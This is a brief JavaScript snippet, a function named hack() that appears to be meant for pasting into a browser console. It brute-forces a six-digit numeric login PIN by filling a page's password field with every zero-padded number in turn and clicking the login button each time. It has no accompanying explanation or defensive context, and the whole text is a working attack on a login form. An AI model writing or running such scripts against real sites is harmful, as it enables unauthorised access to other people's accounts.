function hack(){ 
    var psw = 0;
    while (psw < 999999){
        var psw_str = "";
        for(let i =0; i<6-String(psw).length; i++){
            psw_str += "0";
        }
        psw_str += String(psw);
        password.value = psw_str;
        console.log(psw_str);
        login.click();
        psw += 1;

    }
}